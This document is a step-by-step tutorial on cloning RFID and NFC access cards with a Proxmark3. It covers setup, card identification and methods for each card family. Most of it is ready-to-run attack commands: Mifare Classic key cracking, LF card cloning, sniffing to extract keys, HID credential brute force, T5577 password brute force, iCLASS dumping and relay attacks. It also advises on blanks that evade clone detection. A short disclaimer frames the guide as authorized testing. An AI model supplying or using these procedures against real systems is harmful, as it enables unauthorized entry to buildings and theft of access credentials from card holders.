# How RFID/NFC Cards Are Cloned

A comprehensive guide to RFID and NFC card security assessment using the **Proxmark3** — covering attack methodologies for Mifare Classic, HID Prox, EM4100, iCLASS, Mifare Ultralight, NTAG, DESFire, and more.

> **Disclaimer:** This guide is for **educational and authorized security research purposes only**. Cloning cards you do not own or do not have written permission to test is illegal in most jurisdictions. Always obtain proper authorization before testing any access control system.

> **Note on EMV / credit cards:** Visa, Mastercard, and other chip-based payment cards use dynamic cryptographic authentication (EMV). They **cannot be cloned** with a Proxmark3 or any simple reader. Each transaction generates a unique cryptogram — a static copy will not work.

---

## Table of Contents

- [Prerequisites](#prerequisites)
- [Setup](#setup)
- [Understanding Card Types](#understanding-card-types)
- [Writable Card Types](#writable-card-types)
- [Method 1 — Cloning LF Cards (125 kHz)](#method-1--cloning-lf-cards-125-khz)
- [Method 2 — Cloning Mifare Classic (HF)](#method-2--cloning-mifare-classic-hf)
- [Method 3 — Sniffing / Eavesdropping](#method-3--sniffing--eavesdropping)
- [Method 4 — Card Emulation / Simulation](#method-4--card-emulation--simulation)
- [Method 5 — Brute Force Attacks](#method-5--brute-force-attacks)
- [Method 6 — Relay / Replay Attacks](#method-6--relay--replay-attacks)
- [Method 7 — Cloning Mifare Ultralight / NTAG](#method-7--cloning-mifare-ultralight--ntag)
- [Method 8 — Cloning iCLASS / HID iCLASS](#method-8--cloning-iclass--hid-iclass)
- [Method 9 — Standalone Mode Operations](#method-9--standalone-mode-operations)
- [Method 10 — Mifare DESFire Reconnaissance](#method-10--mifare-desfire-reconnaissance)
- [Method 11 — LF Brute Force & Credential Guessing](#method-11--lf-brute-force--credential-guessing)
- [Method 12 — T5577 Password Protected Cards](#method-12--t5577-password-protected-cards)
- [Antenna Tuning & Hardware Diagnostics](#antenna-tuning--hardware-diagnostics)
- [Troubleshooting](#troubleshooting)
- [Full Command Reference](#full-command-reference)
- [Resources](#resources)

---

## Prerequisites

- An internet connection (to download firmware and software)
- A computer — Linux, macOS, Windows, or Raspberry Pi (3/4/5)
- A **Proxmark3** (Easy, RDV2, or RDV4)
- **Writable blank cards** matching the type you want to clone (see [Writable Card Types](#writable-card-types))
- A USB cable (or USB OTG cable for Android)
- Optionally, a portable power bank for headless/mobile operation

### Proxmark3 Model Comparison

| Feature | PM3 Easy (~$40) | PM3 RDV2 (~$100) | PM3 RDV4 (~$300) |
|---------|-----------------|-------------------|-------------------|
| LF antenna | Built-in | Built-in | Built-in (tunable) |
| HF antenna | Built-in | Built-in | Built-in (tunable) |
| Standalone mode | Limited | Yes | Yes (with flash storage) |
| Bluetooth | No | No | Yes (optional module) |
| Battery | No | No | Yes (optional module) |
| Smart card slot | No | No | Yes (for iCLASS/SE) |
| Build quality | Basic | Good | Excellent |

---

## Setup

### Linux (Recommended)

Linux has the best Proxmark3 support. Works on Debian, Ubuntu, Kali, Arch, etc.

**1. Install dependencies**

```bash
sudo apt update
sudo apt install git build-essential libreadline-dev gcc-arm-none-eabi libusb-1.0-0-dev qtbase5-dev pkg-config
```

**2. Clone the RRG (Iceman) firmware**

The [RRG/Iceman fork](https://github.com/RfidResearchGroup/proxmark3) is the actively maintained community firmware with the most features.

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
```

**3. Build the client and firmware**

For Proxmark3 Easy / RDV2 (generic):

```bash
make clean && make all PLATFORM=PM3GENERIC
```

For Proxmark3 RDV4:

```bash
make clean && make all PLATFORM=PM3RDV4
```

**4. Flash the firmware**

Hold the button on the Proxmark3 **before** plugging it in (keep holding for 2 seconds). Two LEDs should glow, indicating bootloader mode.

```bash
./pm3-flash-all
```

**5. Run the client**

```bash
./pm3
```

> **Tip:** Add your user to the `dialout` group to avoid needing `sudo`:
> ```bash
> sudo usermod -aG dialout $USER
> ```
> Log out and back in for this to take effect.

---

### macOS

**1. Install Xcode CLI Tools**

You do **not** need the full Xcode app — just the command-line tools:

```bash
xcode-select --install
```

**2. Install Homebrew**

```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

**3. Install Proxmark3 via Homebrew**

```bash
brew tap RfidResearchGroup/proxmark3
brew install proxmark3
```

**4. Flash the firmware**

Hold the button on the Proxmark3 before plugging it in (two LEDs = bootloader mode):

```bash
pm3-flash-all
```

**5. Run the client**

```bash
pm3
```

---

### Android (Kali Nethunter)

Requires **Nethunter Rooted** with kernel support for USB serial devices.

```bash
sudo apt update && sudo apt install proxmark3
```

Connect the Proxmark3 via USB OTG and find the port:

```bash
ls /dev/ttyACM*
```

Launch the client:

```bash
pm3 -p /dev/ttyACM0
```

---

### Windows

Use the [precompiled Windows releases](https://github.com/RfidResearchGroup/proxmark3/releases) from the RRG repo. Extract, install the drivers (included), and run `pm3.bat`.

---

## Understanding Card Types

Before cloning, you need to know what kind of card you're dealing with.

| Frequency | Standard | Common Uses | Proxmark3 Prefix | Security Level |
|-----------|----------|-------------|------------------|----------------|
| **125 kHz (LF)** | EM4100 | Parking, basic access | `lf em` | None — ID only |
| **125 kHz (LF)** | HID Prox | Building access | `lf hid` | None — ID only |
| **125 kHz (LF)** | Indala | Building access | `lf indala` | None — ID only |
| **125 kHz (LF)** | AWID | Building access | `lf awid` | None — ID only |
| **125 kHz (LF)** | Paradox | Access control | `lf paradox` | None — ID only |
| **125 kHz (LF)** | Viking | Access control | `lf viking` | None — ID only |
| **125 kHz (LF)** | Pyramid | Access control | `lf pyramid` | None — ID only |
| **125 kHz (LF)** | FDX-B | Animal tracking | `lf fdxb` | None — ID only |
| **13.56 MHz (HF)** | Mifare Classic 1K/4K | Transit, office access | `hf mf` | Weak (CRYPTO1) |
| **13.56 MHz (HF)** | Mifare Ultralight | Transit tickets, events | `hf mfu` | Minimal |
| **13.56 MHz (HF)** | Mifare Ultralight C | Tickets, limited access | `hf mfu` | 3DES |
| **13.56 MHz (HF)** | NTAG 213/215/216 | NFC tags, Amiibo | `hf mfu` | Optional password |
| **13.56 MHz (HF)** | Mifare DESFire | High-security access | `hf mfdes` | Strong (AES/3DES) |
| **13.56 MHz (HF)** | iCLASS Legacy | HID corporate access | `hf iclass` | Weak (known master key) |
| **13.56 MHz (HF)** | iCLASS SE/SEOS | HID corporate access | `hf iclass` | Strong (diversified keys) |
| **13.56 MHz (HF)** | ISO 15693 | Library books, inventory | `hf 15` | Minimal |

**Identify any unknown card:**

```bash
lf search
hf search
```

Or let Proxmark3 try both:

```bash
auto
```

---

## Writable Card Types

You need the right blank card for cloning. Not all blanks are equal.

### LF (125 kHz) Writable Cards

| Type | Use Case | Notes |
|------|----------|-------|
| **T5577** | Universal LF writable — can emulate EM4100, HID, Indala, AWID, and more | Most versatile LF blank |
| **EM4305** | EM4100-compatible writable | Simpler than T5577, only emulates EM4100 |

### HF (13.56 MHz) Writable Cards

| Type | Also Called | UID Writable | Best For | Notes |
|------|-----------|--------------|----------|-------|
| **Gen1a** | "Magic" UID | Yes (via backdoor command) | Testing | Detectable — responds to magic backdoor commands |
| **Gen2 / CUID** | Direct write | Yes (direct write to block 0) | General cloning | Less detectable than Gen1a |
| **Gen3 / APDU** | Semi-magic | Yes (via APDU command) | Bypassing detection | Does not respond to Gen1a detection |
| **Gen4 / Ultimate** | "GDM" / "GTU" | Yes | Advanced cloning | Can change SAK, ATQA, ATS — most resistant to detection |
| **NTAG Magic** | Magic NTAG | Yes | NFC tag cloning | For cloning NTAG 213/215/216 |
| **Ultralight Magic** | UL-C Magic | Yes | Transit tickets | For cloning Mifare Ultralight |
| **iCLASS blank** | Picopass | Varies | iCLASS cloning | Writable via `hf iclass` |

> **Choosing the right card:**
> - Gen1a: cheap, great for testing, but easily detected by modern readers
> - Gen2 (CUID): best balance of compatibility and stealth for Mifare Classic
> - Gen4 (Ultimate): use when the reader checks for magic card signatures or verifies SAK/ATQA/ATS

### How Magic Card Detection Works

Some access control systems check for magic cards:

| Detection Method | Gen1a | Gen2 | Gen3 | Gen4 |
|-----------------|-------|------|------|------|
| Backdoor command check | **Detected** | Pass | Pass | Pass |
| Block 0 write attempt | **Detected** | **Detected** | Pass | Configurable |
| SAK/ATQA mismatch | N/A | N/A | N/A | Pass (configurable) |
| ATS fingerprinting | N/A | N/A | N/A | Pass (configurable) |

---

## Method 1 — Cloning LF Cards (125 kHz)

Low-frequency cards have **no encryption** — they continuously broadcast a static ID. This makes them the easiest to clone.

### EM4100

The most basic and common LF card.

**Read:**

```bash
lf em 410x reader
```

**Clone to T5577:**

```bash
lf em 410x clone --id <ID>
```

**Verify the clone:**

```bash
lf em 410x reader
```

### HID Prox

**Read:**

```bash
lf hid reader
```

**Decode the credential (understand facility code + card number):**

```bash
lf hid decode -r <RAW_DATA>
```

**Clone to T5577:**

```bash
lf hid clone -r <RAW_DATA>
```

**Clone using facility code and card number directly:**

```bash
lf hid clone -w H10301 --fc <FACILITY_CODE> --cn <CARD_NUMBER>
```

> **HID Wiegand Formats:**
> - **H10301**: 26-bit (most common) — 8-bit facility code, 16-bit card number
> - **H10302**: 37-bit — 16-bit facility code, 19-bit card number
> - **H10304**: 37-bit with facility code
> - **Corporate 1000-35**: 35-bit
> - **Corporate 1000-48**: 48-bit

### Indala

**Read:**

```bash
lf indala reader
```

**Clone to T5577:**

```bash
lf indala clone -r <RAW_DATA>
```

### AWID

**Read:**

```bash
lf awid reader
```

**Clone to T5577:**

```bash
lf awid clone --fmt <FORMAT_LEN> --fc <FACILITY_CODE> --cn <CARD_NUMBER>
```

### Paradox

```bash
lf paradox reader
lf paradox clone --fc <FC> --cn <CN>
```

### Viking

```bash
lf viking reader
lf viking clone --cn <CARD_ID>
```

### Pyramid

```bash
lf pyramid reader
lf pyramid clone --fc <FC> --cn <CN>
```

### FDX-B (Animal Microchip)

```bash
lf fdxb reader
lf fdxb clone --country <CODE> --national <ID> --animal
```

---

## Method 2 — Cloning Mifare Classic (HF)

Mifare Classic uses sector-based encryption with 48-bit keys. The crypto (CRYPTO1) has been broken since 2008 and keys can be recovered through multiple attack vectors.

### Understanding Mifare Classic Structure

```
Mifare Classic 1K: 16 sectors × 4 blocks × 16 bytes = 1024 bytes
Mifare Classic 4K: 32 sectors × 4 blocks + 8 sectors × 16 blocks = 4096 bytes

Each sector's last block (trailer) stores:
  - Key A (6 bytes) — always
  - Access bits (4 bytes) — permissions
  - Key B (6 bytes) — optional second key
```

**Block 0** (first block, sector 0) contains the manufacturer data:
- Bytes 0-3: **UID** (4 bytes for Classic, 7 bytes for EV1)
- Byte 4: **BCC** (checksum)
- Byte 5: **SAK**
- Bytes 6-7: **ATQA**
- Bytes 8-15: Manufacturer data

### Attack Flowchart

```
Unknown Mifare Classic card
        │
        ▼
  ┌─────────────┐
  │  hf mf chk  │ ◄── Try default/known keys
  └──────┬──────┘
         │
    Found keys? ──── No ──┐
         │                │
        Yes               ▼
         │         ┌──────────────┐
         ▼         │ hf mf darkside│ ◄── Recover first key (weak PRNG only)
  ┌─────────────┐  └──────┬───────┘
  │ hf mf nested│         │
  └──────┬──────┘    Found key?
         │               │
         ▼              Yes
  All keys found?        │
         │               ▼
        Yes        ┌──────────────┐
         │         │ hf mf nested │
         ▼         └──────┬───────┘
  ┌─────────────┐         │
  │  hf mf dump │         │
  └──────┬──────┘    No keys + hardened PRNG?
         │               │
         ▼               ▼
  ┌──────────────┐  ┌──────────────────┐
  │ hf mf restore│  │ hf mf hardnested │ ◄── Slow but works on any card
  └──────────────┘  └──────────────────┘
```

### The Easy Way — `autopwn`

The `autopwn` command automates the entire flowchart above:

```bash
hf mf autopwn
```

This will:
1. Detect the card type and UID
2. Check the PRNG type (weak or hardened)
3. Try default/known keys against all sectors
4. Run nested, hardnested, or darkside attacks as needed
5. Dump all data and keys to files

Output files:
- `hf-mf-<UID>-dump.bin` — card data
- `hf-mf-<UID>-key.bin` — recovered keys

### Manual Key Recovery

#### Default Key Check

Many cards still use factory default keys:

```bash
hf mf chk --1k
```

Common default keys: `FFFFFFFFFFFF`, `A0A1A2A3A4A5`, `D3F7D3F7D3F7`, `000000000000`

Load a custom key dictionary:

```bash
hf mf chk --1k -f <path_to_keyfile>
```

#### Nested Attack

Requires **at least one known key**. Exploits a weakness in CRYPTO1's PRNG to recover remaining keys.

```bash
hf mf nested --1k -k <KNOWN_KEY> --dump
```

For 4K cards:

```bash
hf mf nested --4k -k <KNOWN_KEY> --dump
```

#### Static Nested Attack

For cards with a **static (non-random) nonce** — some cheap Mifare clones:

```bash
hf mf staticnested --1k -k <KNOWN_KEY>
```

#### Darkside Attack

Works when **no keys are known**, but only on cards with a **weak PRNG**:

```bash
hf mf darkside
```

This exploits a vulnerability in CRYPTO1's random number generator to recover one key from scratch.

#### Hardnested Attack

For cards with a **hardened PRNG** where darkside doesn't work. Slower but works on almost any Mifare Classic card:

```bash
hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta
```

Parameters:
- `--blk 0 -a`: known key is for block 0, key A
- `-k FFFFFFFFFFFF`: the known key value
- `--tblk 4 --ta`: target block 4, key A

### Dumping and Cloning

**Dump card data** (after all keys are recovered):

```bash
hf mf dump
```

**Place a writable blank card on the reader, then restore:**

```bash
hf mf restore
```

This writes all data blocks **and sets the UID** (block 0) if the target card supports it.

**If the UID was not written** (non-magic card or incompatible type):

For Gen1a magic cards:

```bash
hf mf csetuid --uid <ORIGINAL_UID>
```

For Gen4 Ultimate cards:

```bash
hf mf gdmsetuid --uid <ORIGINAL_UID>
```

**Set SAK/ATQA on Gen4 cards** (to match original exactly):

```bash
hf mf gdmsetblk --blk 0 -d <FULL_BLOCK0_HEX>
```

### Verify the Clone

```bash
hf mf info
hf search
```

Compare UID, SAK, ATQA, and data blocks with the original.

**Read specific blocks to verify data integrity:**

```bash
hf mf rdbl --blk 4 -a -k <KEY>
```

---

## Method 3 — Sniffing / Eavesdropping

Capture the communication between a legitimate card and reader without touching either one. Useful when you cannot physically access the card.

### HF Sniffing (13.56 MHz)

**Position the Proxmark3 antenna between the reader and card during a normal tap.**

```bash
hf sniff
```

Or specifically for ISO14443-A (Mifare):

```bash
hf 14a sniff -c -r
```

- `-c`: capture card-to-reader communication
- `-r`: capture reader-to-card communication

**View captured data:**

```bash
hf 14a list
```

**Extract keys from sniffed traces:**

If you captured an authentication exchange, the Proxmark3 client can recover the CRYPTO1 key from the trace:

```bash
hf mf klist
```

> The trace contains nonces exchanged during authentication. Because CRYPTO1 is broken, a single captured authentication sequence is enough to derive the sector key.

### LF Sniffing (125 kHz)

```bash
lf sniff -v
```

**View captured data:**

```bash
lf search
```

### Practical Sniffing Tips

- **Distance matters** — the antenna must be within a few centimeters of the reader-card interaction
- **Coil orientation** — keep the Proxmark3 coil parallel to the reader antenna
- **Multiple captures** — sniff several interactions to ensure you got clean data
- **Power considerations** — HF sniffing is passive; the reader's field powers the card

---

## Method 4 — Card Emulation / Simulation

Instead of writing to a physical blank card, the Proxmark3 can **pretend to be a card**. Useful for testing readers without burning blanks.

### Simulate a Mifare Classic Card

Using previously dumped data:

```bash
hf mf sim --1k -u <UID>
```

Simulate with a specific UID and loaded dump:

```bash
hf mf sim --1k -u <UID> -f hf-mf-<UID>-dump.bin
```

### Simulate a Mifare Ultralight / NTAG

```bash
hf mfu sim -t 7 -u <UID>
```

Type numbers: `2` = UL, `7` = NTAG 215

### Simulate an HID Card

```bash
lf hid sim -r <RAW_DATA>
```

Or with facility code and card number:

```bash
lf hid sim -w H10301 --fc <FC> --cn <CN>
```

### Simulate an EM4100 Card

```bash
lf em 410x sim --id <ID>
```

### Emulation vs Simulation

| | Simulation | Physical Clone |
|--|-----------|----------------|
| **Requires blank card** | No | Yes |
| **Persistent** | No (stops when PM3 disconnects) | Yes |
| **Detectable** | Timing differences possible | Harder to detect |
| **Use case** | Testing, reconnaissance | Persistent access during authorized testing |

---

## Method 5 — Brute Force Attacks

When no keys are known and darkside/hardnested attacks don't apply.

### Dictionary Attack on Mifare Classic

Test a large list of known keys:

```bash
hf mf chk --1k -f mfc_default_keys.dic
```

The RRG firmware includes several dictionaries in the `dictionaries/` folder:
- `mfc_default_keys.dic` — common factory defaults
- `mfc_default_keys_extended.dic` — larger collection of known keys

### Brute Force Key A/B on Specific Sector

```bash
hf mf fchk --blk 0 -a
```

### NTAG/Ultralight Password Brute Force

NTAG cards can have a 4-byte (32-bit) password:

```bash
hf mfu pwdgen -r
```

Try known password generation algorithms (based on UID):

```bash
hf mfu pwdgen -u <UID>
```

Some manufacturers use predictable password algorithms based on the UID. The Proxmark3 knows several of these.

---

## Method 6 — Relay / Replay Attacks

### Concept

A relay attack extends the range between a card and reader using two devices. One device sits near the victim's card (even through a wallet/pocket), the other near the target reader. Communication is relayed in real-time.

```
[Victim's Card] ←→ [Device A / "Mole"] ←——relay——→ [Device B / "Proxy"] ←→ [Target Reader]
```

### Replay with Proxmark3

Proxmark3 can capture and replay HF card responses:

**1. Record a valid transaction:**

```bash
hf 14a sniff -c -r
```

**2. Analyze the captured trace:**

```bash
hf 14a list
```

**3. Replay specific responses** (for protocols without challenge-response):

```bash
hf 14a raw -a -b 7 -d <HEX_DATA>
```

> **Limitations:** Replay attacks only work against systems without challenge-response authentication. Modern systems use random nonces that change each transaction, making simple replay ineffective. However, if you've recovered the keys (via sniffing), you can simulate a card that responds to challenges correctly.

---

## Method 7 — Cloning Mifare Ultralight / NTAG

### Mifare Ultralight

Used in transit systems, event tickets, and disposable NFC applications.

**Read the card:**

```bash
hf mfu info
hf mfu dump
```

**Structure:**
- Pages 0-1: UID (7 bytes)
- Page 2: Internal, lock bytes
- Page 3: OTP (One-Time Programmable)
- Pages 4+: User data

**Clone to a Magic Ultralight card:**

```bash
hf mfu restore -s -f hf-mfu-<UID>-dump.bin
```

> **OTP pages** (One-Time Programmable) can only have bits set from 0→1, never 1→0 on genuine cards. Magic cards bypass this.

### NTAG 213 / 215 / 216

Common in NFC tags, Amiibo figures, and smart posters.

| Type | User Memory | Total Pages |
|------|------------|-------------|
| NTAG 213 | 144 bytes | 45 pages |
| NTAG 215 | 504 bytes | 135 pages |
| NTAG 216 | 888 bytes | 231 pages |

**Read:**

```bash
hf mfu info
hf mfu dump
```

**If the card is password-protected:**

```bash
hf mfu dump -k <PASSWORD_HEX>
```

**Try auto-generated passwords based on UID:**

```bash
hf mfu pwdgen -u <UID>
```

**Clone to a Magic NTAG blank:**

```bash
hf mfu restore -s -f hf-mfu-<UID>-dump.bin
```

---

## Method 8 — Cloning iCLASS / HID iCLASS

iCLASS (also known as Picopass) is used in HID corporate access control.

### iCLASS Legacy (Standard Key)

Uses a **known global master key** — easily dumpable.

**Read:**

```bash
hf iclass reader
```

**Dump using the default key index:**

```bash
hf iclass dump --ki 0
```

**Clone to an iCLASS blank:**

```bash
hf iclass restore -f hf-iclass-<CSN>-dump.bin
```

### iCLASS with Custom Keys

If the system uses non-default keys:

**Try the key diversification attack:**

```bash
hf iclass lookup --csn <CSN> --epurse <EPURSE> --macs <MAC_DATA> -f iclass_default_keys.dic
```

### iCLASS SE / SEOS

These use **diversified keys** derived from a master key and the card's serial number. Without the master key, you cannot clone these cards with a standard Proxmark3.

> The RDV4's smart card module can perform some iCLASS SE operations if you have the appropriate credentials loaded.

---

## Method 9 — Standalone Mode Operations

The Proxmark3 RDV4 (and some Easy models) can operate without a computer — useful for field operations during authorized testing.

### Flash a Standalone Module

Available standalone modes are compiled into the firmware. Common ones:

| Mode | Function |
|------|----------|
| `HF_MFCSIM` | Simulate a Mifare Classic card |
| `HF_14ASNIFF` | Sniff HF communications |
| `LF_EM4100RWC` | Read and clone EM4100 cards |
| `LF_HIDBRUTE` | Brute force HID facility/card codes |
| `LF_SAMYRUN` | Read then simulate LF cards |
| `HF_MSDSAL` | Capture Mifare auth data for offline cracking |

**Build with a standalone mode:**

```bash
make clean && make all PLATFORM=PM3RDV4 STANDALONE=LF_SAMYRUN
```

**Usage:** Disconnect from the computer. Press the button to cycle through modes. LEDs indicate status.

### LF_SAMYRUN Workflow

1. Press button → Proxmark3 waits for an LF card
2. Present a card → it reads and stores the ID
3. Press button again → Proxmark3 replays/simulates the stored card
4. Present to reader → access granted (during authorized test)

---

## Method 10 — Mifare DESFire Reconnaissance

DESFire uses **AES or 3DES encryption** and is significantly harder to attack than Mifare Classic. Full cloning is generally not possible without the application keys.

### What You CAN Do

**Read publicly available information:**

```bash
hf mfdes info
```

This reveals:
- UID and card version
- Available applications and file structure
- Free memory
- Security configuration

**List applications:**

```bash
hf mfdes lsapp
```

**Read files if they allow public access (no authentication required):**

```bash
hf mfdes read --aid <APP_ID> --fid <FILE_ID>
```

### What You CANNOT Do (Without Keys)

- Read authenticated files
- Write data
- Clone the card
- Modify the application structure

> DESFire EV1/EV2/EV3 is considered secure against practical attacks. Focus your security assessment on the **system architecture** — the card itself may be strong, but the backend validation might have weaknesses.

---

## Method 11 — LF Brute Force & Credential Guessing

Since LF cards have no authentication, you can guess valid credentials if you know the format.

### HID Credential Brute Force

If you know the facility code, brute force the card number:

```bash
lf hid brute -w H10301 --fc <KNOWN_FC> --cn 1 --cn2 65535 -d 1000
```

Parameters:
- `--fc`: known facility code
- `--cn` / `--cn2`: card number range to try
- `-d`: delay between attempts (ms)

> **Use case:** During an authorized pentest, if you find one valid HID card, you know the facility code and can try other card numbers in that range.

### Known Credential Enumeration

If you've obtained a few valid card numbers, look for patterns:

```bash
# Decode several captured cards
lf hid decode -r <RAW1>
lf hid decode -r <RAW2>
lf hid decode -r <RAW3>
```

Facility codes and card numbers often follow sequential or patterned assignments.

---

## Method 12 — T5577 Password Protected Cards

Some T5577 cards (writable LF blanks) are password-protected to prevent tampering.

### Check if a T5577 is Password Protected

```bash
lf t55xx detect
```

If it says "password protected," you'll need the password to read/write.

### Recover the Password

**Try default passwords:**

```bash
lf t55xx chk
```

**Brute force** (slow — 32-bit password space):

```bash
lf t55xx bruteforce -s 00000000 -e FFFFFFFF
```

### Write with a Known Password

```bash
lf t55xx write -b 0 -d <DATA> -p <PASSWORD>
```

### Remove the Password

```bash
lf t55xx protect -n 00000000 -p <CURRENT_PASSWORD> --clear
```

---

## Antenna Tuning & Hardware Diagnostics

### Check Antenna Performance

```bash
hw tune
```

Optimal values:
- **LF antenna:** 20V+ (45V+ is ideal)
- **HF antenna:** 10V+ (30V+ is ideal)

Low voltage = poor read range. Check antenna connections, cable quality, and for physical damage.

### Check Firmware Version

```bash
hw version
```

### Test FPGA and Processor

```bash
hw status
```

### Measure LF Field Strength

```bash
lf tune --mix
```

Useful for finding the optimal position relative to a reader's antenna.

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Proxmark3 not detected | Check USB cable, try `ls /dev/ttyACM*`, add user to `dialout` group |
| Bootloader mode won't activate | Hold button **before** plugging in, hold for 2+ seconds |
| `autopwn` finds no keys | Card may use non-default keys — try `hf mf darkside` first |
| `hf search` returns nothing | Ensure card is centered on the **HF antenna** (the large coil) |
| LF card not reading | Use the **LF antenna** (the small coil on RDV4, or flip the Easy model) |
| Flash fails on older hardware | Try `./pm3-flash-bootrom` first, then `./pm3-flash-fullimage` separately |
| Permission denied on serial port | `sudo usermod -aG dialout $USER` then log out/in |
| `hw tune` shows low voltage | Check antenna connection, try a shorter/better USB cable |
| Card reads but clone doesn't work at reader | Verify UID, SAK, ATQA match — try a Gen4 Ultimate card |
| Darkside attack fails | Card has hardened PRNG — use `hf mf hardnested` instead |
| Nested attack fails | Only one key known, or card uses static nonce — try `hf mf staticnested` |
| Client crashes on connect | Update firmware and client to the same version — version mismatch causes issues |

---

## Full Command Reference

### General

| Command | Description |
|---------|-------------|
| `auto` | Auto-detect card on any antenna |
| `hw tune` | Check antenna tuning |
| `hw version` | Show firmware version |
| `hw status` | Hardware diagnostics |

### LF Commands

| Command | Description |
|---------|-------------|
| `lf search` | Auto-detect LF card type |
| `lf sniff` | Capture raw LF data |
| `lf em 410x reader` | Read EM4100 |
| `lf em 410x clone --id <ID>` | Clone EM4100 to T5577 |
| `lf hid reader` | Read HID Prox |
| `lf hid clone -r <RAW>` | Clone HID to T5577 |
| `lf hid brute` | Brute force HID credentials |
| `lf hid decode -r <RAW>` | Decode HID credential format |
| `lf indala reader` | Read Indala |
| `lf indala clone` | Clone Indala to T5577 |
| `lf awid reader` | Read AWID |
| `lf awid clone` | Clone AWID to T5577 |
| `lf t55xx detect` | Detect T5577 configuration |
| `lf t55xx chk` | Check T5577 default passwords |
| `lf tune` | LF antenna field analysis |

### HF Commands

| Command | Description |
|---------|-------------|
| `hf search` | Auto-detect HF card type |
| `hf sniff` | Capture raw HF data |
| `hf 14a sniff -c -r` | Sniff ISO14443-A communication |
| `hf 14a list` | List sniffed ISO14443-A frames |
| `hf 14a raw` | Send raw ISO14443-A commands |
| `hf mf info` | Mifare Classic card info |
| `hf mf autopwn` | Automated key recovery + dump |
| `hf mf chk --1k` | Check default keys |
| `hf mf nested` | Nested key recovery attack |
| `hf mf staticnested` | Static nonce nested attack |
| `hf mf darkside` | Darkside attack (weak PRNG) |
| `hf mf hardnested` | Hardnested attack (any PRNG) |
| `hf mf dump` | Dump all card data |
| `hf mf restore` | Write dump to blank card |
| `hf mf rdbl` | Read specific block |
| `hf mf wrbl` | Write specific block |
| `hf mf csetuid` | Set UID on Gen1a magic card |
| `hf mf sim` | Simulate a Mifare Classic card |
| `hf mfu info` | Mifare Ultralight / NTAG info |
| `hf mfu dump` | Dump Ultralight / NTAG |
| `hf mfu restore` | Write to Ultralight / NTAG blank |
| `hf mfu pwdgen` | Generate NTAG passwords from UID |
| `hf iclass reader` | Read iCLASS card |
| `hf iclass dump` | Dump iCLASS data |
| `hf iclass restore` | Write to iCLASS blank |
| `hf mfdes info` | DESFire card information |
| `hf mfdes lsapp` | List DESFire applications |
| `hf 15 info` | ISO 15693 card info |
| `hf 15 dump` | Dump ISO 15693 card |

---

## Resources

- [Proxmark3 RRG/Iceman Repo](https://github.com/RfidResearchGroup/proxmark3)
- [Proxmark3 Wiki](https://github.com/RfidResearchGroup/proxmark3/wiki)
- [Proxmark3 Command Overview](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/commands.md)
- [Mifare Classic — CRYPTO1 Vulnerabilities](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/mifare_classic.md)
- [T5577 Configuration Guide](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/T5577_Guide.md)
- [iCLASS / Picopass Notes](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/iclass.md)
